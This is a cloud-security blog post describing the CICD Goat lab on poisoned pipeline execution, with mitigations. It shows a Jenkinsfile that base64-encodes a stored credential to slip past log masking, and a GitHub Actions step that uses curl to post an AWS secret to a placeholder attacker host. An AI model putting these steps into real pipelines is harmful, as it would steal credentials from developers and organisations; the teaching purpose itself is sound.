---
title: '100 Days of Cloud Security - Day 78: CICD Goat - Direct Poisoned Pipeline Execution (PPE)'
date: '2026-01-27'
author: 'Venkata Pathuri'
excerpt: 'Day 78 of my cloud security journey - CICD Goat - Direct Poisoned Pipeline Execution (PPE)'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 78: CICD Goat - Direct Poisoned Pipeline Execution (PPE)

## Overview
Welcome back to Day 78 of our cloud security journey! Today, we delve into one of the more insidious vulnerabilities in CI/CD systems: Direct Poisoned Pipeline Execution (PPE). Building on yesterday's exploration of CI/CD security risks, we will learn how attackers can manipulate build pipelines to exfiltrate sensitive information stored within them. Understanding these vulnerabilities is critical for securing your development processes and ensuring the integrity of your software delivery.

## Learning Objectives
By the end of today's session, you'll master the concept of Poisoned Pipeline Execution, particularly how it can be exploited in Jenkins and how similar tactics apply to other CI/CD platforms like GitHub Actions. You will also gain practical insights into how to implement robust security measures to safeguard your pipelines against such attacks. This knowledge is essential for protecting your applications and sensitive data in the cloud.

## Deep Dive
### Understanding Poisoned Pipeline Execution (PPE)
Poisoned Pipeline Execution refers to vulnerabilities in CI/CD systems that allow malicious actors to inject harmful commands into build processes. There are two primary types of PPE: 

1. **Direct PPE**: Involves altering the pipeline configuration file (e.g., `Jenkinsfile`).
2. **Indirect PPE**: Involves modifying files utilized during the pipeline's execution.

### The Attack Scenario
In our lab, we will analyze a Jenkins pipeline associated with the **WhiteRabbit** repository. The goal is to exfiltrate a secret credential labeled `flag1` from the Jenkins credential store. This is accomplished by embedding a payload within the `Jenkinsfile`, which executes during the build process.

#### The Malicious Jenkinsfile
Here’s an example of how the payload is structured:

```groovy
pipeline {
    agent any
    environment {
        PROJECT = "src/urllib3"
        FLAG = credentials("flag1") // The secret we want to exfiltrate
    }
    stages {
        stage ('Install_Requirements') {
            steps {
                // The Attack: Encode the flag to bypass masking
                sh """
                    echo $FLAG | base64
                """
            }
        }
        stage ('Lint') {
            steps {
                sh "pylint ${PROJECT} || true"
            }
        }
        stage ('Unit Tests') {
            steps {
                sh "pytest"
            }
        }
    }
    post { 
        always { 
            cleanWs()
        }
    }
}
```

### How the Attack Works
During execution, Jenkins retrieves the `flag1` credential. If we simply echoed the flag, Jenkins would mask it with asterisks (`****`). However, by encoding it using Base64, we circumvent this measure. Jenkins does not recognize the encoded string as sensitive data, allowing us to capture it in the console logs. Once we have the encoded flag, we can decode it locally to reveal the original secret.

### Comparisons: GitHub Actions
To illustrate this vulnerability in another context, consider GitHub Actions. An attacker may fork a public repository, modify the workflow file, and submit a pull request. Here’s an example of a malicious GitHub Actions workflow file:

```yaml
name: CI
on: [push, pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    
    - name: Run Tests
      run: npm test
      
    - name: Malicious Exfiltration
      env:
        AWS_SECRET: ${{ secrets.AWS_SECRET_ACCESS_KEY }} # Accessing a secret
      run: |
        # Attacker sends the secret to their own server
        curl -X POST -d "data=$AWS_SECRET" https://attacker-site.com/log
```

If secrets are not restricted for builds from forked repositories, this attack can successfully exfiltrate sensitive credentials.

### Current Best Practices
To mitigate the risks of Poisoned Pipeline Execution, consider these best practices:

- **Protect Pipeline Files**: Use mechanisms like `CODEOWNERS` in Git to require mandatory reviews for changes to critical files like `Jenkinsfile` or workflow configurations.
- **Separate Credentials**: Avoid using production secrets in testing or staging environments where developers have write access.
- **Restrict Fork Secrets**: Ensure your CI/CD platform is configured to prevent secrets from being exposed in builds triggered by pull requests from forked repositories.
- **Least Privilege**: Ensure the build agent or runner only possesses the necessary permissions to build the application, avoiding full administrative access.

## Hands-On Practice
To solidify your understanding, you can simulate this attack in a controlled environment. Here’s how:

1. **Set Up a Jenkins Instance**: Create a Jenkins instance where you have administrative access.
2. **Create a New Pipeline**: Use the provided malicious `Jenkinsfile` in the pipeline configuration.
3. **Run the Pipeline**: Trigger the pipeline and observe the console output.
4. **Capture the Encoded Output**: Look for the Base64 encoded flag in the logs.
5. **Decode the Output**: Use a Base64 decoder locally to retrieve the original flag.

### Expected Outcomes
Upon successful execution, you should see the encoded string in the Jenkins console output. Decoding this string will reveal the original secret.

### Common Troubleshooting Tips
- Ensure that your Jenkins instance is configured properly to allow credential access.
- Verify that your Jenkinsfile syntax is correct to prevent any pipeline failures.

## Key Takeaways
Today, we've uncovered how Poisoned Pipeline Execution can compromise CI/CD processes, enabling attackers to extract sensitive credentials by leveraging a few clever tricks. Recognizing these vulnerabilities empowers you to implement effective safeguards against such security risks, ensuring your development pipelines remain secure.

## Real-World Applications
In real-world scenarios, organizations must be vigilant about protecting their CI/CD pipelines. The implications of a successful PPE attack can be severe, leading to unauthorized access to sensitive data and potential breaches. By adopting the practices outlined today, you can significantly reduce the likelihood of such vulnerabilities impacting your applications and data security.

---
**Journey Progress:** 78/100 Days Complete 🚀